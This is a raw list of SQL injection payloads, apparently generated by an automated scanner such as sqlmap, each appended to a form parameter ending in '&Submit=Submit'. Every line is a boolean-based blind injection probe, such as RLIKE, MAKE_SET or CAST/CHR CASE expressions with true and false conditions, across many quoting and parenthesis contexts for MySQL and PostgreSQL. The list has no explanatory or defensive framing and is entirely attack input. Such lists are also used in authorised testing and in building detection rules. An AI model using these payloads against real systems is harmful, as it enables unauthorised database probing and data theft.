+1')) AND 7944=1167&Submit=Submit
+1')) AND 5002=5002&Submit=Submit
+1')) AND 6542=3435&Submit=Submit
+1'))) AND 2714=8665&Submit=Submit
+1'))) AND 5002=5002&Submit=Submit
+1'))) AND 8834=4485&Submit=Submit
+1") AND 3783=5955&Submit=Submit
+1") AND 5002=5002&Submit=Submit
+1") AND 5764=2310&Submit=Submit
+1")) AND 8418=9022&Submit=Submit
+1")) AND 5002=5002&Submit=Submit
+1")) AND 1818=1440&Submit=Submit
+1" AND 9179=7020&Submit=Submit
+1" AND 5002=5002&Submit=Submit
+1" AND 6347=5254&Submit=Submit
+1%') AND 4549=5781&Submit=Submit
+1%') AND 5002=5002&Submit=Submit
+1%') AND 1589=7865&Submit=Submit
+1%')) AND 9349=6769&Submit=Submit
+1%')) AND 5002=5002&Submit=Submit
+1%')) AND 2263=2920&Submit=Submit
+1%' AND 3910=3073&Submit=Submit
+1%' AND 5002=5002&Submit=Submit
+1%' AND 5327=7209&Submit=Submit
+1%" AND 7136=7251&Submit=Submit
+1%" AND 5002=5002&Submit=Submit
+1%" AND 7833=7903&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (8785=6455) THEN 1 ELSE 0x28 END))-- YiXa&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END))-- OwpH&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (9342=9750) THEN 1 ELSE 0x28 END))-- Klpp&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (6383=9641) THEN 1 ELSE 0x28 END)) AND (3525=3525&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (6818=6818&Submit=Submit
+1) RLIKE (SELECT (CASE WHEN (2763=6913) THEN 1 ELSE 0x28 END)) AND (6424=6424&Submit=Submit
+1)) RLIKE (SELECT (CASE WHEN (8926=3093) THEN 1 ELSE 0x28 END)) AND ((6309=6309&Submit=Submit
+1)) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ((9915=9915&Submit=Submit
+1)) RLIKE (SELECT (CASE WHEN (6242=5461) THEN 1 ELSE 0x28 END)) AND ((4415=4415&Submit=Submit
+1))) RLIKE (SELECT (CASE WHEN (2996=2261) THEN 1 ELSE 0x28 END)) AND (((4584=4584&Submit=Submit
+1))) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (((5152=5152&Submit=Submit
+1))) RLIKE (SELECT (CASE WHEN (2904=9415) THEN 1 ELSE 0x28 END)) AND (((6536=6536&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (5202=4842) THEN 1 ELSE 0x28 END))&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END))&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (5722=2495) THEN 1 ELSE 0x28 END))&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (7187=9566) THEN 1 ELSE 0x28 END))-- YWdj&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END))-- rHaG&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (4974=8962) THEN 1 ELSE 0x28 END))-- ojUB&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (8958=1648) THEN 1 ELSE 0x28 END))# Zkmk&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END))# BMxy&Submit=Submit
+1 RLIKE (SELECT (CASE WHEN (4329=3207) THEN 1 ELSE 0x28 END))# exzo&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (4157=7929) THEN 1 ELSE 0x28 END))-- jYQG&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END))-- pchN&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (4873=3552) THEN 1 ELSE 0x28 END))-- jvww&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (4597=8628) THEN 1 ELSE 0x28 END)) AND ('TYfh'='TYfh&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ('BdgK'='BdgK&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (7231=8167) THEN 1 ELSE 0x28 END)) AND ('PqwH'='PqwH&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (3608=1214) THEN 1 ELSE 0x28 END)) AND (('sVNQ'='sVNQ&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (('vjiy'='vjiy&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (6777=8354) THEN 1 ELSE 0x28 END)) AND (('Xdhp'='Xdhp&Submit=Submit
+1'))) RLIKE (SELECT (CASE WHEN (2950=2840) THEN 1 ELSE 0x28 END)) AND ((('VtEO'='VtEO&Submit=Submit
+1'))) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ((('ipuD'='ipuD&Submit=Submit
+1'))) RLIKE (SELECT (CASE WHEN (6952=3901) THEN 1 ELSE 0x28 END)) AND ((('GBYa'='GBYa&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (7257=6605) THEN 1 ELSE 0x28 END)) AND 'WICA'='WICA&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND 'SGTm'='SGTm&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (4365=6182) THEN 1 ELSE 0x28 END)) AND 'WJaz'='WJaz&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (9596=3222) THEN 1 ELSE 0x28 END)) AND ('rGbX' LIKE 'rGbX&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ('LjMC' LIKE 'LjMC&Submit=Submit
+1') RLIKE (SELECT (CASE WHEN (4519=3975) THEN 1 ELSE 0x28 END)) AND ('flmS' LIKE 'flmS&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (5837=9479) THEN 1 ELSE 0x28 END)) AND (('Inxf' LIKE 'Inxf&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (('ofLr' LIKE 'ofLr&Submit=Submit
+1')) RLIKE (SELECT (CASE WHEN (8629=2150) THEN 1 ELSE 0x28 END)) AND (('NCtO' LIKE 'NCtO&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (8211=4521) THEN 1 ELSE 0x28 END)) AND 'abNN' LIKE 'abNN&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND 'llTG' LIKE 'llTG&Submit=Submit
+1' RLIKE (SELECT (CASE WHEN (3311=1101) THEN 1 ELSE 0x28 END)) AND 'Phcq' LIKE 'Phcq&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (9785=3356) THEN 1 ELSE 0x28 END)) AND ("zZcQ"="zZcQ&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ("hVdf"="hVdf&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (7868=8090) THEN 1 ELSE 0x28 END)) AND ("pJrM"="pJrM&Submit=Submit
+1")) RLIKE (SELECT (CASE WHEN (2510=1117) THEN 1 ELSE 0x28 END)) AND (("PfCf"="PfCf&Submit=Submit
+1")) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (("buNX"="buNX&Submit=Submit
+1")) RLIKE (SELECT (CASE WHEN (5136=1492) THEN 1 ELSE 0x28 END)) AND (("klcs"="klcs&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (1472=1975) THEN 1 ELSE 0x28 END)) AND "wrYM"="wrYM&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND "cxRJ"="cxRJ&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (2606=4025) THEN 1 ELSE 0x28 END)) AND "Jcgj"="Jcgj&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (1691=2639) THEN 1 ELSE 0x28 END)) AND ("HnjA" LIKE "HnjA&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ("zzSH" LIKE "zzSH&Submit=Submit
+1") RLIKE (SELECT (CASE WHEN (8885=6282) THEN 1 ELSE 0x28 END)) AND ("ngUz" LIKE "ngUz&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (3058=5834) THEN 1 ELSE 0x28 END)) AND "KDEe" LIKE "KDEe&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND "GDBw" LIKE "GDBw&Submit=Submit
+1" RLIKE (SELECT (CASE WHEN (5375=3790) THEN 1 ELSE 0x28 END)) AND "ssfv" LIKE "ssfv&Submit=Submit
+1%') RLIKE (SELECT (CASE WHEN (9131=3481) THEN 1 ELSE 0x28 END)) AND ('%'='&Submit=Submit
+1%') RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND ('%'='&Submit=Submit
+1%') RLIKE (SELECT (CASE WHEN (7959=1966) THEN 1 ELSE 0x28 END)) AND ('%'='&Submit=Submit
+1%')) RLIKE (SELECT (CASE WHEN (4584=4484) THEN 1 ELSE 0x28 END)) AND (('%'='&Submit=Submit
+1%')) RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND (('%'='&Submit=Submit
+1%')) RLIKE (SELECT (CASE WHEN (9604=7527) THEN 1 ELSE 0x28 END)) AND (('%'='&Submit=Submit
+1%' RLIKE (SELECT (CASE WHEN (3634=6879) THEN 1 ELSE 0x28 END)) AND '%'='&Submit=Submit
+1%' RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND '%'='&Submit=Submit
+1%' RLIKE (SELECT (CASE WHEN (9624=7858) THEN 1 ELSE 0x28 END)) AND '%'='&Submit=Submit
+1%" RLIKE (SELECT (CASE WHEN (9125=4596) THEN 1 ELSE 0x28 END)) AND "%"="&Submit=Submit
+1%" RLIKE (SELECT (CASE WHEN (2056=2056) THEN 1 ELSE 0x28 END)) AND "%"="&Submit=Submit
+1%" RLIKE (SELECT (CASE WHEN (3297=4084) THEN 1 ELSE 0x28 END)) AND "%"="&Submit=Submit
+1) AND MAKE_SET(4984=4647,4647)-- cmfv&Submit=Submit
+1) AND MAKE_SET(1252=1252,2557)-- hSzk&Submit=Submit
+1) AND MAKE_SET(9879=1044,1044)-- zIhR&Submit=Submit
+1) AND MAKE_SET(5328=4842,4842) AND (7239=7239&Submit=Submit
+1) AND MAKE_SET(1252=1252,2557) AND (2650=2650&Submit=Submit
+1) AND MAKE_SET(4060=2134,2134) AND (8573=8573&Submit=Submit
+1)) AND MAKE_SET(1643=2989,2989) AND ((2677=2677&Submit=Submit
+1)) AND MAKE_SET(1252=1252,2557) AND ((4566=4566&Submit=Submit
+1)) AND MAKE_SET(3246=7310,7310) AND ((2341=2341&Submit=Submit
+1))) AND MAKE_SET(7945=7198,7198) AND (((7030=7030&Submit=Submit
+1))) AND MAKE_SET(1252=1252,2557) AND (((9514=9514&Submit=Submit
+1))) AND MAKE_SET(8179=3328,3328) AND (((7614=7614&Submit=Submit
+1 AND MAKE_SET(9579=2847,2847)&Submit=Submit
+1 AND MAKE_SET(1252=1252,2557)&Submit=Submit
+1 AND MAKE_SET(2121=9421,9421)&Submit=Submit
+1 AND MAKE_SET(7306=2457,2457)-- TXeB&Submit=Submit
+1 AND MAKE_SET(1252=1252,2557)-- Pcvr&Submit=Submit
+1 AND MAKE_SET(7146=1321,1321)-- CdLS&Submit=Submit
+1 AND MAKE_SET(3977=1770,1770)# VtSa&Submit=Submit
+1 AND MAKE_SET(1252=1252,2557)# NgmL&Submit=Submit
+1 AND MAKE_SET(2249=1578,1578)# TLGh&Submit=Submit
+1' AND MAKE_SET(1829=6656,6656)-- hEjm&Submit=Submit
+1' AND MAKE_SET(1252=1252,2557)-- Vynl&Submit=Submit
+1' AND MAKE_SET(7834=6123,6123)-- QAqp&Submit=Submit
+1') AND MAKE_SET(8228=2097,2097) AND ('TFyw'='TFyw&Submit=Submit
+1') AND MAKE_SET(1252=1252,2557) AND ('slYo'='slYo&Submit=Submit
+1') AND MAKE_SET(9185=6872,6872) AND ('qFqh'='qFqh&Submit=Submit
+1')) AND MAKE_SET(4751=4306,4306) AND (('GvTY'='GvTY&Submit=Submit
+1')) AND MAKE_SET(1252=1252,2557) AND (('oazF'='oazF&Submit=Submit
+1')) AND MAKE_SET(8054=3559,3559) AND (('lSqd'='lSqd&Submit=Submit
+1'))) AND MAKE_SET(4810=5535,5535) AND ((('NfXQ'='NfXQ&Submit=Submit
+1'))) AND MAKE_SET(1252=1252,2557) AND ((('FiiU'='FiiU&Submit=Submit
+1'))) AND MAKE_SET(8827=6938,6938) AND ((('LoDV'='LoDV&Submit=Submit
+1' AND MAKE_SET(2135=9573,9573) AND 'fWiO'='fWiO&Submit=Submit
+1' AND MAKE_SET(1252=1252,2557) AND 'hyLl'='hyLl&Submit=Submit
+1' AND MAKE_SET(8216=6570,6570) AND 'HZLo'='HZLo&Submit=Submit
+1') AND MAKE_SET(9992=5090,5090) AND ('Mfka' LIKE 'Mfka&Submit=Submit
+1') AND MAKE_SET(1252=1252,2557) AND ('ebTk' LIKE 'ebTk&Submit=Submit
+1') AND MAKE_SET(7190=8353,8353) AND ('wiLR' LIKE 'wiLR&Submit=Submit
+1')) AND MAKE_SET(6304=7311,7311) AND (('pYPR' LIKE 'pYPR&Submit=Submit
+1')) AND MAKE_SET(1252=1252,2557) AND (('DNFM' LIKE 'DNFM&Submit=Submit
+1')) AND MAKE_SET(1603=3468,3468) AND (('zPGE' LIKE 'zPGE&Submit=Submit
+1' AND MAKE_SET(5709=2815,2815) AND 'TDef' LIKE 'TDef&Submit=Submit
+1' AND MAKE_SET(1252=1252,2557) AND 'Uyws' LIKE 'Uyws&Submit=Submit
+1' AND MAKE_SET(5457=8157,8157) AND 'wyKO' LIKE 'wyKO&Submit=Submit
+1") AND MAKE_SET(2730=4826,4826) AND ("rvvr"="rvvr&Submit=Submit
+1") AND MAKE_SET(1252=1252,2557) AND ("JUKq"="JUKq&Submit=Submit
+1") AND MAKE_SET(3949=6758,6758) AND ("yIpg"="yIpg&Submit=Submit
+1")) AND MAKE_SET(5354=6849,6849) AND (("CmPu"="CmPu&Submit=Submit
+1")) AND MAKE_SET(1252=1252,2557) AND (("erhl"="erhl&Submit=Submit
+1")) AND MAKE_SET(8400=1174,1174) AND (("sNDr"="sNDr&Submit=Submit
+1" AND MAKE_SET(9567=7129,7129) AND "oNxS"="oNxS&Submit=Submit
+1" AND MAKE_SET(1252=1252,2557) AND "VcLk"="VcLk&Submit=Submit
+1" AND MAKE_SET(5173=2577,2577) AND "UAff"="UAff&Submit=Submit
+1") AND MAKE_SET(5825=1257,1257) AND ("GSmx" LIKE "GSmx&Submit=Submit
+1") AND MAKE_SET(1252=1252,2557) AND ("ROwn" LIKE "ROwn&Submit=Submit
+1") AND MAKE_SET(8746=8643,8643) AND ("FqYI" LIKE "FqYI&Submit=Submit
+1" AND MAKE_SET(4670=7741,7741) AND "ymnh" LIKE "ymnh&Submit=Submit
+1" AND MAKE_SET(1252=1252,2557) AND "hRvh" LIKE "hRvh&Submit=Submit
+1" AND MAKE_SET(4432=5830,5830) AND "Olox" LIKE "Olox&Submit=Submit
+1%') AND MAKE_SET(6450=1555,1555) AND ('%'='&Submit=Submit
+1%') AND MAKE_SET(1252=1252,2557) AND ('%'='&Submit=Submit
+1%') AND MAKE_SET(3705=7685,7685) AND ('%'='&Submit=Submit
+1%')) AND MAKE_SET(8997=4117,4117) AND (('%'='&Submit=Submit
+1%')) AND MAKE_SET(1252=1252,2557) AND (('%'='&Submit=Submit
+1%')) AND MAKE_SET(2539=9795,9795) AND (('%'='&Submit=Submit
+1%' AND MAKE_SET(7792=2357,2357) AND '%'='&Submit=Submit
+1%' AND MAKE_SET(1252=1252,2557) AND '%'='&Submit=Submit
+1%' AND MAKE_SET(3404=2603,2603) AND '%'='&Submit=Submit
+1%" AND MAKE_SET(5647=8603,8603) AND "%"="&Submit=Submit
+1%" AND MAKE_SET(1252=1252,2557) AND "%"="&Submit=Submit
+1%" AND MAKE_SET(8428=8265,8265) AND "%"="&Submit=Submit
+1) AND (SELECT (CASE WHEN (3159=5711) THEN NULL ELSE CAST((CHR(122)||CHR(117)||CHR(83)||CHR(73)) AS NUMERIC) END)) IS NULL-- DTkw&Submit=Submit
+1) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL-- bcmB&Submit=Submit
+1) AND (SELECT (CASE WHEN (5258=5083) THEN NULL ELSE CAST((CHR(99)||CHR(121)||CHR(87)||CHR(77)) AS NUMERIC) END)) IS NULL-- cDKY&Submit=Submit
+1) AND (SELECT (CASE WHEN (5677=9602) THEN NULL ELSE CAST((CHR(80)||CHR(103)||CHR(73)||CHR(85)) AS NUMERIC) END)) IS NULL AND (1411=1411&Submit=Submit
+1) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (2197=2197&Submit=Submit
+1) AND (SELECT (CASE WHEN (4804=9732) THEN NULL ELSE CAST((CHR(78)||CHR(70)||CHR(115)||CHR(122)) AS NUMERIC) END)) IS NULL AND (6477=6477&Submit=Submit
+1)) AND (SELECT (CASE WHEN (1338=2036) THEN NULL ELSE CAST((CHR(80)||CHR(114)||CHR(89)||CHR(119)) AS NUMERIC) END)) IS NULL AND ((6954=6954&Submit=Submit
+1)) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ((4678=4678&Submit=Submit
+1)) AND (SELECT (CASE WHEN (8911=5245) THEN NULL ELSE CAST((CHR(98)||CHR(73)||CHR(78)||CHR(121)) AS NUMERIC) END)) IS NULL AND ((1312=1312&Submit=Submit
+1))) AND (SELECT (CASE WHEN (5726=7874) THEN NULL ELSE CAST((CHR(97)||CHR(113)||CHR(113)||CHR(65)) AS NUMERIC) END)) IS NULL AND (((7263=7263&Submit=Submit
+1))) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (((1805=1805&Submit=Submit
+1))) AND (SELECT (CASE WHEN (3776=2613) THEN NULL ELSE CAST((CHR(103)||CHR(75)||CHR(111)||CHR(79)) AS NUMERIC) END)) IS NULL AND (((9419=9419&Submit=Submit
+1 AND (SELECT (CASE WHEN (6043=9114) THEN NULL ELSE CAST((CHR(98)||CHR(102)||CHR(84)||CHR(67)) AS NUMERIC) END)) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (3869=9333) THEN NULL ELSE CAST((CHR(109)||CHR(104)||CHR(65)||CHR(116)) AS NUMERIC) END)) IS NULL&Submit=Submit
+1 AND (SELECT (CASE WHEN (3953=8692) THEN NULL ELSE CAST((CHR(98)||CHR(112)||CHR(109)||CHR(118)) AS NUMERIC) END)) IS NULL-- DHha&Submit=Submit
+1 AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL-- YFuf&Submit=Submit
+1 AND (SELECT (CASE WHEN (7902=1359) THEN NULL ELSE CAST((CHR(111)||CHR(84)||CHR(81)||CHR(101)) AS NUMERIC) END)) IS NULL-- iZdE&Submit=Submit
+1 AND (SELECT (CASE WHEN (2772=9077) THEN NULL ELSE CAST((CHR(88)||CHR(79)||CHR(72)||CHR(76)) AS NUMERIC) END)) IS NULL# BTuQ&Submit=Submit
+1 AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL# pgZi&Submit=Submit
+1 AND (SELECT (CASE WHEN (6120=9314) THEN NULL ELSE CAST((CHR(117)||CHR(119)||CHR(68)||CHR(108)) AS NUMERIC) END)) IS NULL# MhVM&Submit=Submit
+1' AND (SELECT (CASE WHEN (6220=6466) THEN NULL ELSE CAST((CHR(69)||CHR(79)||CHR(85)||CHR(113)) AS NUMERIC) END)) IS NULL-- lukj&Submit=Submit
+1' AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL-- vbty&Submit=Submit
+1' AND (SELECT (CASE WHEN (9246=6296) THEN NULL ELSE CAST((CHR(69)||CHR(103)||CHR(104)||CHR(107)) AS NUMERIC) END)) IS NULL-- LqlR&Submit=Submit
+1') AND (SELECT (CASE WHEN (6203=7433) THEN NULL ELSE CAST((CHR(111)||CHR(107)||CHR(72)||CHR(99)) AS NUMERIC) END)) IS NULL AND ('SnLM'='SnLM&Submit=Submit
+1') AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ('mOZO'='mOZO&Submit=Submit
+1') AND (SELECT (CASE WHEN (1692=3030) THEN NULL ELSE CAST((CHR(88)||CHR(98)||CHR(118)||CHR(105)) AS NUMERIC) END)) IS NULL AND ('BDNT'='BDNT&Submit=Submit
+1')) AND (SELECT (CASE WHEN (5184=9102) THEN NULL ELSE CAST((CHR(107)||CHR(88)||CHR(90)||CHR(119)) AS NUMERIC) END)) IS NULL AND (('FHjM'='FHjM&Submit=Submit
+1')) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (('kQfP'='kQfP&Submit=Submit
+1')) AND (SELECT (CASE WHEN (5413=8504) THEN NULL ELSE CAST((CHR(111)||CHR(101)||CHR(101)||CHR(101)) AS NUMERIC) END)) IS NULL AND (('CmNy'='CmNy&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (8686=4440) THEN NULL ELSE CAST((CHR(77)||CHR(98)||CHR(75)||CHR(102)) AS NUMERIC) END)) IS NULL AND ((('HWTh'='HWTh&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ((('AWxO'='AWxO&Submit=Submit
+1'))) AND (SELECT (CASE WHEN (7397=5926) THEN NULL ELSE CAST((CHR(81)||CHR(109)||CHR(66)||CHR(86)) AS NUMERIC) END)) IS NULL AND ((('tCuZ'='tCuZ&Submit=Submit
+1' AND (SELECT (CASE WHEN (3783=6993) THEN NULL ELSE CAST((CHR(108)||CHR(100)||CHR(100)||CHR(115)) AS NUMERIC) END)) IS NULL AND 'OXTq'='OXTq&Submit=Submit
+1' AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND 'eVUg'='eVUg&Submit=Submit
+1' AND (SELECT (CASE WHEN (5742=7832) THEN NULL ELSE CAST((CHR(110)||CHR(87)||CHR(111)||CHR(104)) AS NUMERIC) END)) IS NULL AND 'sKZj'='sKZj&Submit=Submit
+1') AND (SELECT (CASE WHEN (2064=1385) THEN NULL ELSE CAST((CHR(82)||CHR(88)||CHR(82)||CHR(109)) AS NUMERIC) END)) IS NULL AND ('aYKz' LIKE 'aYKz&Submit=Submit
+1') AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ('WPCX' LIKE 'WPCX&Submit=Submit
+1') AND (SELECT (CASE WHEN (1936=8623) THEN NULL ELSE CAST((CHR(65)||CHR(107)||CHR(99)||CHR(118)) AS NUMERIC) END)) IS NULL AND ('bydC' LIKE 'bydC&Submit=Submit
+1')) AND (SELECT (CASE WHEN (4507=7641) THEN NULL ELSE CAST((CHR(82)||CHR(108)||CHR(76)||CHR(74)) AS NUMERIC) END)) IS NULL AND (('zulm' LIKE 'zulm&Submit=Submit
+1')) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (('rpFs' LIKE 'rpFs&Submit=Submit
+1')) AND (SELECT (CASE WHEN (3358=5508) THEN NULL ELSE CAST((CHR(86)||CHR(74)||CHR(101)||CHR(72)) AS NUMERIC) END)) IS NULL AND (('qgDD' LIKE 'qgDD&Submit=Submit
+1' AND (SELECT (CASE WHEN (9761=6388) THEN NULL ELSE CAST((CHR(121)||CHR(101)||CHR(101)||CHR(105)) AS NUMERIC) END)) IS NULL AND 'uCWn' LIKE 'uCWn&Submit=Submit
+1' AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND 'RVHl' LIKE 'RVHl&Submit=Submit
+1' AND (SELECT (CASE WHEN (5743=4645) THEN NULL ELSE CAST((CHR(104)||CHR(66)||CHR(90)||CHR(107)) AS NUMERIC) END)) IS NULL AND 'DWLs' LIKE 'DWLs&Submit=Submit
+1") AND (SELECT (CASE WHEN (2854=4755) THEN NULL ELSE CAST((CHR(111)||CHR(102)||CHR(79)||CHR(77)) AS NUMERIC) END)) IS NULL AND ("PxOt"="PxOt&Submit=Submit
+1") AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ("mLCG"="mLCG&Submit=Submit
+1") AND (SELECT (CASE WHEN (5556=3256) THEN NULL ELSE CAST((CHR(66)||CHR(100)||CHR(69)||CHR(116)) AS NUMERIC) END)) IS NULL AND ("lFyz"="lFyz&Submit=Submit
+1")) AND (SELECT (CASE WHEN (1865=8449) THEN NULL ELSE CAST((CHR(90)||CHR(99)||CHR(73)||CHR(110)) AS NUMERIC) END)) IS NULL AND (("GxqN"="GxqN&Submit=Submit
+1")) AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND (("hGrI"="hGrI&Submit=Submit
+1")) AND (SELECT (CASE WHEN (2423=7379) THEN NULL ELSE CAST((CHR(77)||CHR(115)||CHR(98)||CHR(75)) AS NUMERIC) END)) IS NULL AND (("fUwG"="fUwG&Submit=Submit
+1" AND (SELECT (CASE WHEN (5047=2650) THEN NULL ELSE CAST((CHR(105)||CHR(79)||CHR(97)||CHR(114)) AS NUMERIC) END)) IS NULL AND "FjkV"="FjkV&Submit=Submit
+1" AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND "niJh"="niJh&Submit=Submit
+1" AND (SELECT (CASE WHEN (2003=8936) THEN NULL ELSE CAST((CHR(69)||CHR(72)||CHR(66)||CHR(100)) AS NUMERIC) END)) IS NULL AND "RVMY"="RVMY&Submit=Submit
+1") AND (SELECT (CASE WHEN (3615=9822) THEN NULL ELSE CAST((CHR(70)||CHR(69)||CHR(103)||CHR(120)) AS NUMERIC) END)) IS NULL AND ("qCHs" LIKE "qCHs&Submit=Submit
+1") AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ("BrSm" LIKE "BrSm&Submit=Submit
+1") AND (SELECT (CASE WHEN (8766=7797) THEN NULL ELSE CAST((CHR(100)||CHR(73)||CHR(110)||CHR(81)) AS NUMERIC) END)) IS NULL AND ("QYMC" LIKE "QYMC&Submit=Submit
+1" AND (SELECT (CASE WHEN (9092=8691) THEN NULL ELSE CAST((CHR(97)||CHR(117)||CHR(82)||CHR(67)) AS NUMERIC) END)) IS NULL AND "tNuY" LIKE "tNuY&Submit=Submit
+1" AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND "wcWV" LIKE "wcWV&Submit=Submit
+1" AND (SELECT (CASE WHEN (9501=4997) THEN NULL ELSE CAST((CHR(114)||CHR(111)||CHR(106)||CHR(69)) AS NUMERIC) END)) IS NULL AND "Kasy" LIKE "Kasy&Submit=Submit
+1%') AND (SELECT (CASE WHEN (6428=2958) THEN NULL ELSE CAST((CHR(121)||CHR(114)||CHR(98)||CHR(82)) AS NUMERIC) END)) IS NULL AND ('%'='&Submit=Submit
+1%') AND (SELECT (CASE WHEN (2943=2943) THEN NULL ELSE CAST((CHR(120)||CHR(116)||CHR(112)||CHR(97)) AS NUMERIC) END)) IS NULL AND ('%'='&Submit=Submit
